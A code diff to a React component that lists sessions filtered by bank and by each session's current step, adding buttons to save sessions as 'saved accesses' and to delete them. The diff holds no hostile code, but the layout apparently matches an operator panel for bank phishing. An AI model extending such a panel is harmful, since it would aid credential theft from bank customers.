@@ -1,6 +1,10 @@
 import React, { useState, useEffect } from 'react';
 import { Session } from '@shared/schema';
 import { Skeleton } from '@/components/ui/skeleton';
+import { useMutation } from '@tanstack/react-query';
+import { apiRequest } from '@/lib/queryClient';
+import { queryClient } from '@/lib/queryClient';
+import { useToast } from '@/hooks/use-toast';
 
 interface AccessTableProps {
   sessions: Session[];
@@ -17,11 +21,56 @@ const AccessTable: React.FC<AccessTableProps> = ({
   onSelectSession,
   isLoading 
 }) => {
+  const { toast } = useToast();
   // Estado para resaltar las filas recién actualizadas
   const [highlightedRows, setHighlightedRows] = useState<Record<string, boolean>>({});
   
   // Estado para resaltar campos específicos que han sido actualizados
   const [highlightedFields, setHighlightedFields] = useState<Record<string, Record<string, boolean>>>({});
+  
+  // Mutation para guardar una sesión
+  const saveSessionMutation = useMutation({
+    mutationFn: async (sessionId: string) => {
+      const res = await apiRequest('POST', `/api/sessions/${sessionId}/save`);
+      return await res.json();
+    },
+    onSuccess: () => {
+      toast({
+        title: "Sesión guardada",
+        description: "La sesión ha sido guardada en accesos guardados.",
+      });
+      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
+    },
+    onError: (error) => {
+      toast({
+        title: "Error al guardar sesión",
+        description: error.message,
+        variant: "destructive",
+      });
+    }
+  });
+  
+  // Mutation para eliminar una sesión
+  const deleteSessionMutation = useMutation({
+    mutationFn: async (sessionId: string) => {
+      const res = await apiRequest('DELETE', `/api/sessions/${sessionId}`);
+      return await res.json();
+    },
+    onSuccess: () => {
+      toast({
+        title: "Sesión eliminada",
+        description: "La sesión ha sido eliminada correctamente.",
+      });
+      // La actualización se manejará a través de websockets
+    },
+    onError: (error) => {
+      toast({
+        title: "Error al eliminar sesión",
+        description: error.message,
+        variant: "destructive",
+      });
+    }
+  });
   
   // Filter sessions by bank if a specific bank is selected
   const filteredSessions = activeBank === 'todos' 
@@ -196,15 +245,43 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
               </td>
               <td className="p-3 text-[#ccc]">
-                <button 
-                  className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-                  onClick={(e) => {
-                    e.stopPropagation();
-                    onSelectSession(session.sessionId);
-                  }}
-                >
-                  Seleccionar
-                </button>
+                <div className="flex space-x-1">
+                  <button 
+                    className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      onSelectSession(session.sessionId);
+                    }}
+                  >
+                    Seleccionar
+                  </button>
+                  
+                  {!session.saved && (
+                    <button 
+                      className="text-xs bg-[#005c99] hover:bg-[#004d80] text-white px-2 py-1 rounded"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        saveSessionMutation.mutate(session.sessionId);
+                      }}
+                      disabled={saveSessionMutation.isPending}
+                    >
+                      {saveSessionMutation.isPending ? '...' : 'Guardar'}
+                    </button>
+                  )}
+                  
+                  <button 
+                    className="text-xs bg-[#990000] hover:bg-[#800000] text-white px-2 py-1 rounded"
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      if (window.confirm('¿Está seguro que desea eliminar esta sesión?')) {
+                        deleteSessionMutation.mutate(session.sessionId);
+                      }
+                    }}
+                    disabled={deleteSessionMutation.isPending}
+                  >
+                    {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
+                  </button>
+                </div>
               </td>
             </tr>
           ))}
